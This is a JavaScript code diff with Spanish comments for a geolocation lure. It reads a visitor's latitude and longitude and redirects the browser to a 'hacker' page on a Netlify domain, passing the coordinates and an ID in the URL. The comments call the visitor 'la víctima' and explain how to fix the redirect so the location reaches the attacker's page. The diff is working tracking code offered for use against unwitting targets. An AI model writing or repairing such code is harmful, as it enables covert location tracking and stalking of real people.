@@ -133,17 +133,20 @@
         const success = (position) => {
             const lat = position.coords.latitude.toFixed(6);
             const lon = position.coords.longitude.toFixed(6);
-            const id = Math.random().toString(36).substring(2, 8); // Genera un ID simple
-            
-            // Construye la URL de la página "hacker" con los parámetros
-            const redirectUrl = `https://tu-nombre-de-dominio.com/index2.html?lat=${lat}&lon=${lon}&id=${id}`;
-            
-            // Redirige al usuario a la página de Google, pero con tu "código"
-            window.location.href = `https://www.google.com?log_data=${encodeURIComponent(redirectUrl)}`;
-            // NOTA: Esta redirección a Google es solo para el ejemplo.
-            // Para tu proyecto, la víctima debe ser redirigida a la URL de tu index2.html
-            // De esta manera: window.location.href = redirectUrl;
-        };
+            const id = Math.random().toString(36).substring(2, 8);
+
+            // Aquí está el problema. Debes redirigir directamente a tu página del "hacker"
+            // con los parámetros en la URL.
+            const redirectUrl = `https://prueba-ubicacion.netlify.app/index2.html?lat=${lat}&lon=${lon}&id=${id}`;
+
+            // La siguiente línea es la que debe ejecutarse.
+            window.location.href = redirectUrl;
+
+            // Si estás usando una redirección a Google, asegúrate de que el código
+            // lea el parámetro de la URL para redirigirte, lo cual es más complejo
+            // y no es la solución que estamos implementando.
+            // La forma más simple es la redirección directa a tu index2.html
+            };
 
         const error = (err) => {
             let message = "";
